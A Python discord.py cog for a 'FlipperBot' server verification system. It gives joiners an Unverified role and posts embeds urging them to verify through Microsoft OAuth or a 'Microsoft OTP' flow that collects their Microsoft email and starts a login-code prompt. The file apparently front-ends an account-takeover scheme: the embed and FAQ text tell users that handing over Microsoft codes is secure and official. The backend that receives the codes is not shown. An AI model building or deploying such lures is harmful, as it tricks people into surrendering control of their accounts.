import discord
from discord.ext import commands
from discord import app_commands
import logging
import asyncio
from typing import Optional, Dict, Set
from datetime import datetime, timedelta
from config_manager import ConfigManager
from auth_manager import AuthManager

logger = logging.getLogger('button_interactions')
config = ConfigManager()

# Rate limiting protection - More aggressive settings
class RateLimiter:
    def __init__(self, max_calls: int = 5, time_window: int = 60):
        self.max_calls = max_calls  # Maximum calls per time window
        self.time_window = time_window  # Time window in seconds
        self.user_calls: Dict[int, Set[datetime]] = {}  # Track calls by user
        self.global_last_call = datetime.now() - timedelta(seconds=5)  # Track last call globally
        
    def is_rate_limited(self, user_id: int) -> bool:
        """Check if a user is rate limited"""
        now = datetime.now()
        
        # Initialize user tracking if needed
        if user_id not in self.user_calls:
            self.user_calls[user_id] = set()
            
        # Remove old timestamps
        self.user_calls[user_id] = {ts for ts in self.user_calls[user_id] if now - ts < timedelta(seconds=self.time_window)}
        
        # Check if user is rate limited
        if len(self.user_calls[user_id]) >= self.max_calls:
            return True
            
        # Add current timestamp
        self.user_calls[user_id].add(now)
        return False
        
    async def wait_if_needed(self, user_id: int) -> bool:
        """Wait if user is rate limited, returns True if had to wait"""
        now = datetime.now()
        
        # Always add a small global delay between any API calls
        time_since_last_global = (now - self.global_last_call).total_seconds()
        if time_since_last_global < 1.0:  # Ensure at least 1 second between any API calls
            await asyncio.sleep(1.0 - time_since_last_global + 0.1)  # Add a small buffer
            
        # Update global last call time
        self.global_last_call = datetime.now()
        
        # Check user-specific rate limiting
        if self.is_rate_limited(user_id):
            # Wait longer if user is rate-limited
            await asyncio.sleep(3.0)
            return True
        return False

# Create a global rate limiter with more conservative settings
rate_limiter = RateLimiter(max_calls=2, time_window=15)  # 2 calls per 15 seconds

class VerifyModal(discord.ui.Modal, title="Enter Your Email"):
    """Modal for entering email for Microsoft OTP verification"""
    
    nickname = discord.ui.TextInput(
        label="Nickname",
        placeholder="Your preferred name",
        required=True
    )
    
    email = discord.ui.TextInput(
        label="Microsoft Email",
        placeholder="Email linked to your Microsoft account",
        required=True
    )
    
    def __init__(self, auth_manager):
        super().__init__()
        self.auth_manager = auth_manager
    
    async def on_submit(self, interaction: discord.Interaction):
        try:
            # Check rate limiting
            user_id = interaction.user.id
            if await rate_limiter.wait_if_needed(user_id):
                logger.info(f"Rate limited user {user_id}, added delay")
                
            # Defer the response to avoid interaction timeout
            await interaction.response.defer(ephemeral=True)
            
            # Add additional delay to avoid Cloudflare rate limiting
            await asyncio.sleep(2.0)
            
            nickname_value = self.nickname.value
            email_value = self.email.value
            
            success, message = await self.auth_manager.start_otp_verification(
                interaction.user, 
                nickname_value, 
                email_value
            )
            
            # Add additional delay before sending response
            await asyncio.sleep(1.0)
            
            if success:
                embed = discord.Embed(
                    title="📧 Microsoft OTP Verification",
                    description=message[:4000] if len(message) > 4000 else message,  # Ensure we don't exceed Discord's limit
                    color=discord.Color.blue()
                )
                await interaction.followup.send(embed=embed, ephemeral=True)
            else:
                embed = discord.Embed(
                    title="❌ Verification Error",
                    description=f"Could not start OTP verification: {message[:500] if len(message) > 500 else message}",
                    color=discord.Color.red()
                )
                await interaction.followup.send(embed=embed, ephemeral=True)
                
        except Exception as e:
            logger.error(f"Error in OTP verification modal: {e}")
            try:
                # Make sure error message isn't too long
                error_msg = str(e)
                if len(error_msg) > 500:
                    error_msg = error_msg[:500] + "..."
                    
                await interaction.followup.send(
                    embed=discord.Embed(
                        title="❌ Error",
                        description=f"An error occurred: {error_msg}",
                        color=discord.Color.red()
                    ),
                    ephemeral=True
                )
            except discord.errors.NotFound:
                logger.error("Interaction expired before sending error message")
            except Exception as e2:
                logger.error(f"Error sending error message: {e2}")

class ButtonInteractions(commands.Cog, name="ButtonInteractions"):
    def __init__(self, bot):
        self.bot = bot
        self.auth_manager = None
        logger.info("ButtonInteractions cog initialized")

    @commands.Cog.listener()
    async def on_ready(self):
        """When the bot is ready, initialize components"""
        self.auth_manager = self.bot.auth_manager
        logger.info("ButtonInteractions cog is ready")
        
        # Register persistent view for buttons
        self.register_persistent_views()
        
        # Log registered commands
        commands = [cmd.name for cmd in self.bot.tree.get_commands()]
        logger.info(f"Commands registered: {commands}")
        
        # Check if our command is registered and force sync if needed
        setup_welcome_exists = any(cmd.name == "setup_welcome" for cmd in self.bot.tree.get_commands())
        if not setup_welcome_exists:
            logger.warning("setup_welcome command not found in global commands, forcing sync")
            try:
                await self.bot.tree.sync()
                logger.info("Forced command sync complete")
            except Exception as e:
                logger.error(f"Error forcing command sync: {e}")
    
    def register_persistent_views(self):
        """Register persistent views for buttons to work across restarts"""
        try:
            # Create a persistent view for verification buttons
            view = discord.ui.View(timeout=None)
            
            # OAuth button
            oauth_button = discord.ui.Button(
                style=discord.ButtonStyle.success,
                label=config.get('buttons.verify_label', 'OAuth Login'),
                custom_id='oauth_button',
                emoji="🔐"
            )
            
            # OTP button
            otp_button = discord.ui.Button(
                style=discord.ButtonStyle.blurple,
                label="Microsoft OTP",
                custom_id='otp_button',
                emoji="📧"
            )
            
            # Q&A button
            qa_button = discord.ui.Button(
                style=discord.ButtonStyle.gray,
                label=config.get('buttons.qa_label', 'Q&A'),
                custom_id='qa_button',
                emoji="❓"
            )
            
            # Add buttons to view
            view.add_item(oauth_button)
            view.add_item(otp_button)
            view.add_item(qa_button)
            
            # Register the view
            self.bot.add_view(view)
            logger.info("Registered persistent view for verification buttons")
            
        except Exception as e:
            logger.error(f"Error registering persistent views: {e}")
    
    @app_commands.command(name="setup_welcome", description="Create a welcome embed with verification buttons")
    @app_commands.describe(
        title="Custom title for the welcome embed (leave empty for default)",
        description="Custom description for the welcome embed (leave empty for default)",
        color="Custom color in hex format (e.g. #FF0000 for red, leave empty for default blue)",
        channel="Channel to send the embed to (leave empty for current channel)"
    )
    @app_commands.checks.has_permissions(manage_channels=True)
    async def setup_welcome(
        self, 
        interaction: discord.Interaction, 
        title: Optional[str] = None,
        description: Optional[str] = None,
        color: Optional[str] = None,
        channel: Optional[discord.TextChannel] = None
    ):
        """Create a welcome embed with verification buttons"""
        try:
            # Check rate limiting
            user_id = interaction.user.id
            if await rate_limiter.wait_if_needed(user_id):
                logger.info(f"Rate limited user {user_id}, added delay")
                
            # Always defer first thing
            await interaction.response.defer(ephemeral=True)
            logger.info(f"Setting up welcome embed in {channel.name if channel else interaction.channel.name}")
            
            # Add a larger delay to avoid rate limiting
            await asyncio.sleep(2.0)
            
            target_channel = channel or interaction.channel
            embed_title = title or "🎮 Welcome to FlipperBot!"
            embed_description = description or (
                "Welcome to our server! To gain access to all channels, please verify yourself using one of the methods below.\n\n"
                "**🔐 OAuth Login**\n"
                "• Secure login with your Microsoft account\n"
                "• Quick and easy verification\n\n"
                "**📧 Microsoft OTP**\n"
                "• Microsoft's own verification code system\n"
                "• Receive code via email, SMS, or authenticator app\n\n"
                "**❓ Q&A**\n"
                "• Get help and information\n"
                "• Learn about our verification process"
            )
            
            embed_color = discord.Color.blue()
            if color:
                try:
                    if color.startswith('#'):
                        color = color[1:]
                    embed_color = discord.Color(int(color, 16))
                except ValueError:
                    logger.warning(f"Invalid color format: {color}")
            
            embed = discord.Embed(
                title=embed_title,
                description=embed_description,
                color=embed_color
            )
            embed.set_footer(text="FlipperBot • Verification System", icon_url=self.bot.user.display_avatar.url)
            embed.timestamp = datetime.utcnow()
            
            # Add a larger delay to avoid rate limiting
            await asyncio.sleep(2.0)
            
            view = discord.ui.View(timeout=None)
            oauth_button = discord.ui.Button(
                style=discord.ButtonStyle.success,
                label=config.get('buttons.verify_label', 'OAuth Login'),
                custom_id='oauth_button',
                emoji="🔐"
            )
            otp_button = discord.ui.Button(
                style=discord.ButtonStyle.blurple,
                label="Microsoft OTP",
                custom_id='otp_button',
                emoji="📧"
            )
            qa_button = discord.ui.Button(
                style=discord.ButtonStyle.gray,
                label=config.get('buttons.qa_label', 'Q&A'),
                custom_id='qa_button',
                emoji="❓"
            )
            
            view.add_item(oauth_button)
            view.add_item(otp_button)
            view.add_item(qa_button)
            
            # Add a delay before sending the message
            await asyncio.sleep(1.0)
            
            welcome_msg = await target_channel.send(embed=embed, view=view)
            
            success_embed = discord.Embed(
                title="✅ Welcome Embed Created",
                description=f"Welcome embed with verification buttons has been sent to {target_channel.mention}.",
                color=discord.Color.green()
            )
            
            # Add a larger delay to avoid rate limiting
            await asyncio.sleep(2.0)
            
            # Use followup since we deferred earlier
            await interaction.followup.send(embed=success_embed, ephemeral=True)
            logger.info(f"Welcome embed created successfully in {target_channel.name}")
            
        except Exception as e:
            logger.error(f"Error creating welcome embed: {e}", exc_info=True)
            try:
                # Make sure error message isn't too long
                error_msg = str(e)
                if len(error_msg) > 500:
                    error_msg = error_msg[:500] + "..."
                
                # Add a delay before sending error message
                await asyncio.sleep(1.0)
                
                # Use followup for error message
                await interaction.followup.send(
                    embed=discord.Embed(
                        title="❌ Error Creating Welcome Embed",
                        description=f"An error occurred: {error_msg}",
                        color=discord.Color.red()
                    ),
                    ephemeral=True
                )
            except Exception as followup_error:
                logger.error(f"Could not send error message: {followup_error}")

    @commands.Cog.listener()
    async def on_member_join(self, member: discord.Member):
        """When a member joins, assign unverified role and send welcome message"""
        try:
            logger.info(f"New member joined: {member.display_name} ({member.id})")
            
            # Find or create unverified role
            unverified_role = discord.utils.get(member.guild.roles, name="❌ Unverified")
            if not unverified_role:
                unverified_role = await member.guild.create_role(
                    name="❌ Unverified",
                    color=discord.Color.red(),
                    hoist=True,
                    reason="Created for verification system"
                )
                logger.info(f"Created Unverified role in {member.guild.name}")
            
            # Find or create verified role
            verified_role = discord.utils.get(member.guild.roles, name="✅ Verified")
            if not verified_role:
                verified_role = await member.guild.create_role(
                    name="✅ Verified",
                    color=discord.Color.green(),
                    hoist=True,
                    reason="Created for verification system"
                )
                logger.info(f"Created Verified role in {member.guild.name}")
            
            # Add a delay before assigning role
            await asyncio.sleep(1.0)
            
            # Assign unverified role
            await member.add_roles(unverified_role)
            logger.info(f"Assigned Unverified role to {member.display_name}")
            
            # Add a larger delay to avoid rate limiting
            await asyncio.sleep(2.0)
            
            # Find or create FlipperBot channel
            flipper_channel = discord.utils.get(member.guild.text_channels, name="flipperbot")
            if not flipper_channel:
                # Create channel with proper permissions
                overwrites = {
                    member.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    unverified_role: discord.PermissionOverwrite(read_messages=True, send_messages=False),
                    member.guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                }
                
                # Add a delay before creating channel
                await asyncio.sleep(1.0)
                
                flipper_channel = await member.guild.create_text_channel(
                    name="flipperbot",
                    overwrites=overwrites,
                    reason="Created for verification system"
                )
                logger.info(f"Created FlipperBot channel in {member.guild.name}")
                
                # Add a larger delay to avoid rate limiting
                await asyncio.sleep(3.0)
                
                # Send initial welcome message with buttons
                await self.setup_welcome_message(flipper_channel)
            
            # Add a delay before updating permissions
            await asyncio.sleep(1.0)
            
            # Update channel permissions for the new member
            await flipper_channel.set_permissions(member, read_messages=True, send_messages=False)
            
            # Add a larger delay to avoid rate limiting
            await asyncio.sleep(2.0)
            
            # Send welcome DM
            try:
                embed = discord.Embed(
                    title=f"Welcome to {member.guild.name}!",
                    description=(
                        f"Hello {member.mention}! To access all channels, please verify yourself.\n\n"
                        f"Head to the <#{flipper_channel.id}> channel and follow the instructions."
                    ),
                    color=discord.Color.blue()
                )
                await member.send(embed=embed)
                logger.info(f"Sent welcome DM to {member.display_name}")
            except discord.errors.Forbidden:
                logger.warning(f"Could not send DM to {member.display_name}")
            
        except Exception as e:
            logger.error(f"Error handling member join: {e}", exc_info=True)
    
    async def setup_welcome_message(self, channel: discord.TextChannel):
        """Set up the welcome message with verification buttons"""
        try:
            # Add a delay before creating the embed
            await asyncio.sleep(1.0)
            
            embed = discord.Embed(
                title="🎮 Welcome to FlipperBot!",
                description=(
                    "Welcome to our server! To gain access to all channels, please verify yourself using one of the methods below.\n\n"
                    "**🔐 OAuth Login**\n"
                    "• Secure login with your Microsoft account\n"
                    "• Quick and easy verification\n\n"
                    "**📧 Microsoft OTP**\n"
                    "• Microsoft's own verification code system\n"
                    "• Receive code via email, SMS, or authenticator app\n\n"
                    "**❓ Q&A**\n"
                    "• Get help and information\n"
                    "• Learn about our verification process"
                ),
                color=discord.Color.blue()
            )
            embed.set_footer(text="FlipperBot • Verification System", icon_url=self.bot.user.display_avatar.url)
            embed.timestamp = datetime.utcnow()
            
            view = discord.ui.View(timeout=None)
            oauth_button = discord.ui.Button(
                style=discord.ButtonStyle.success,
                label=config.get('buttons.verify_label', 'OAuth Login'),
                custom_id='oauth_button',
                emoji="🔐"
            )
            otp_button = discord.ui.Button(
                style=discord.ButtonStyle.blurple,
                label="Microsoft OTP",
                custom_id='otp_button',
                emoji="📧"
            )
            qa_button = discord.ui.Button(
                style=discord.ButtonStyle.gray,
                label=config.get('buttons.qa_label', 'Q&A'),
                custom_id='qa_button',
                emoji="❓"
            )
            
            view.add_item(oauth_button)
            view.add_item(otp_button)
            view.add_item(qa_button)
            
            # Add a delay before sending the message
            await asyncio.sleep(1.0)
            
            await channel.send(embed=embed, view=view)
            logger.info(f"Welcome message set up in {channel.name}")
            
        except Exception as e:
            logger.error(f"Error setting up welcome message: {e}", exc_info=True)

    @commands.Cog.listener()
    async def on_interaction(self, interaction: discord.Interaction):
        """Handle button interactions"""
        try:
            # Skip non-component interactions
            if interaction.type != discord.InteractionType.component:
                return
                
            # Check for valid custom_id
            if not hasattr(interaction, 'data') or not interaction.data or 'custom_id' not in interaction.data:
                logger.info(f"Received component interaction without custom_id: {interaction.id}")
                return
                
            custom_id = interaction.data['custom_id']
            
            # Check rate limiting - more aggressive
            user_id = interaction.user.id
            if await rate_limiter.wait_if_needed(user_id):
                logger.info(f"Rate limited user {user_id}, added delay")
            
            # Route to the appropriate handler with error handling
            try:
                if custom_id == 'oauth_button':
                    await self.handle_oauth(interaction)
                elif custom_id == 'otp_button':
                    await self.handle_otp_start(interaction)
                elif custom_id == 'qa_button':
                    await self.handle_qa(interaction)
                else:
                    logger.info(f"Received interaction with unknown custom_id: {custom_id}")
            except discord.errors.NotFound:
                logger.debug(f"Interaction {interaction.id} not found (likely expired)")
            except discord.errors.HTTPException as e:
                if e.code == 40060:  # Interaction has already been acknowledged
                    logger.debug(f"Interaction {interaction.id} already acknowledged")
                else:
                    logger.error(f"HTTP error in interaction {interaction.id}: {e}")
            
        except discord.errors.NotFound:
            # This is expected sometimes when interactions expire
            logger.debug(f"Interaction {interaction.id} not found (likely expired)")
        except discord.errors.HTTPException as e:
            if e.code == 40060:  # Interaction has already been acknowledged
                logger.debug(f"Interaction {interaction.id} already acknowledged")
            else:
                logger.error(f"HTTP error in interaction {interaction.id}: {e}")
        except Exception as e:
            logger.error(f"Error handling interaction {interaction.id}: {e}", exc_info=True)
    
    async def handle_oauth(self, interaction: discord.Interaction):
        """Handle OAuth button click"""
        try:
            # Defer the response to avoid interaction timeout
            await interaction.response.defer(ephemeral=True)
            
            auth_manager = getattr(self.bot, 'auth_manager', None)
            if not auth_manager:
                raise RuntimeError("Auth manager is not initialized.")
            
            # Add a larger delay to avoid rate limiting
            await asyncio.sleep(2.0)
            
            # Pass the user's ID to generate and track the auth URL
            auth_url, state = auth_manager.generate_auth_url(interaction.user.id)
            
            embed = discord.Embed(
                title="🔐 Microsoft Account Verification",
                description=(
                    "Please follow these steps:\n\n"
                    "1️⃣ **Click the Link Below**\n"
                    f"• [Click here to verify with Microsoft]({auth_url})\n\n"
                    "2️⃣ **Login Process**\n"
                    "• Sign in with your Microsoft account\n"
                    "• You will be redirected to a page confirming success.\n\n"
                    "3️⃣ **Completion**\n"
                    "• Return to Discord. Your roles will be updated automatically."
                ),
                color=discord.Color.green()
            )
            
            # Add a delay before sending response
            await asyncio.sleep(1.0)
            
            # Use followup instead of response since we deferred
            await interaction.followup.send(embed=embed, ephemeral=True)
            
        except Exception as e:
            logger.error(f"Error in OAuth process: {e}")
            try:
                # Make sure error message isn't too long
                error_msg = str(e)
                if len(error_msg) > 500:
                    error_msg = error_msg[:500] + "..."
                
                # Add a delay before sending error message
                await asyncio.sleep(1.0)
                
                # Use followup for error message too
                await interaction.followup.send(
                    embed=discord.Embed(
                        title="❌ Verification Error",
                        description=f"An error occurred. Please try again later.\n\nError: {error_msg}",
                        color=discord.Color.red()
                    ),
                    ephemeral=True
                )
            except discord.errors.NotFound:
                logger.error("Interaction expired before sending error message")
            except Exception as e2:
                logger.error(f"Error sending error message: {e2}")
    
    async def handle_otp_start(self, interaction: discord.Interaction):
        """Handle Microsoft OTP button click"""
        try:
            # Check rate limiting - more aggressive
            user_id = interaction.user.id
            if await rate_limiter.wait_if_needed(user_id):
                logger.info(f"Rate limited user {user_id}, added delay")
            
            # Don't defer when sending a modal
            auth_manager = getattr(self.bot, 'auth_manager', None)
            if not auth_manager:
                raise RuntimeError("Auth manager is not initialized.")
            
            # Add a delay before sending the modal
            await asyncio.sleep(1.0)
            
            # IMPORTANT: Send the modal first, before any other response
            modal = VerifyModal(auth_manager)
            
            # Wrap the modal sending in a try-except block to catch interaction errors
            try:
                await interaction.response.send_modal(modal)
                logger.info(f"Successfully sent OTP modal to user {user_id}")
            except discord.errors.NotFound:
                logger.error(f"Interaction {interaction.id} expired before modal could be sent")
            except discord.errors.HTTPException as e:
                if e.code == 40060:  # Interaction already acknowledged
                    logger.error(f"Interaction {interaction.id} was already acknowledged, cannot send modal")
                else:
                    logger.error(f"HTTP error sending modal: {e}")
                    # Try to send an error message if possible
                    try:
                        await interaction.response.send_message(
                            embed=discord.Embed(
                                title="❌ Verification Error",
                                description="An error occurred. Please try again later.",
                                color=discord.Color.red()
                            ),
                            ephemeral=True
                        )
                    except Exception:
                        pass  # Already tried our best
            
        except Exception as e:
            logger.error(f"Error starting OTP verification: {e}")
            # Only try to send an error message if we haven't responded to the interaction yet
            try:
                if not interaction.response.is_done():
                    await interaction.response.send_message(
                        embed=discord.Embed(
                            title="❌ Verification Error",
                            description="An error occurred. Please try again later.",
                            color=discord.Color.red()
                        ),
                        ephemeral=True
                    )
            except Exception as e2:
                logger.error(f"Error sending error message: {e2}")
                
    async def handle_qa(self, interaction: discord.Interaction):
        """Handle Q&A button click"""
        try:
            # Defer the response to avoid interaction timeout
            await interaction.response.defer(ephemeral=True)
            
            # Check rate limiting - more aggressive
            user_id = interaction.user.id
            if await rate_limiter.wait_if_needed(user_id):
                logger.info(f"Rate limited user {user_id}, added delay")
            
            embed = discord.Embed(
                title="❓ Frequently Asked Questions",
                description=(
                    "Here are some common questions and answers about our verification system:\n\n"
                    "**Q: How do I verify my account?**\n"
                    "A: You can verify using either Microsoft OAuth or Microsoft OTP.\n\n"
                    "**Q: What is OAuth verification?**\n"
                    "A: OAuth is a secure way to verify without sharing your password. Click the 'OAuth Login' button and follow the prompts.\n\n"
                    "**Q: What is Microsoft OTP verification?**\n"
                    "A: OTP (One-Time Password) is Microsoft's verification system. Click 'Microsoft OTP', enter your email, and follow the prompts to receive a verification code via email, SMS, or authenticator app.\n\n"
                    "**Q: What email can I use for OTP?**\n"
                    "A: You can use any email address associated with a Microsoft account.\n\n"
                    "**Q: I'm having trouble verifying, what should I do?**\n"
                    "A: Try refreshing the page or using a different verification method. If problems persist, contact a server admin."
                ),
                color=discord.Color.blue()
            )
            
            # Add a larger delay to avoid rate limiting
            await asyncio.sleep(2.0)
            
            # Use followup instead of response since we deferred
            await interaction.followup.send(embed=embed, ephemeral=True)
            
        except Exception as e:
            logger.error(f"Error displaying Q&A: {e}")
            try:
                # Make sure error message isn't too long
                error_msg = str(e)
                if len(error_msg) > 500:
                    error_msg = error_msg[:500] + "..."
                
                # Add a delay before sending error message
                await asyncio.sleep(1.0)
                
                await interaction.followup.send(
                    embed=discord.Embed(
                        title="❌ Error",
                        description=f"An error occurred. Please try again later.",
                        color=discord.Color.red()
                    ),
                    ephemeral=True
                )
            except discord.errors.NotFound:
                logger.error("Interaction expired before sending error message")
            except Exception as e2:
                logger.error(f"Error sending error message: {e2}")

async def setup(bot):
    await bot.add_cog(ButtonInteractions(bot)) 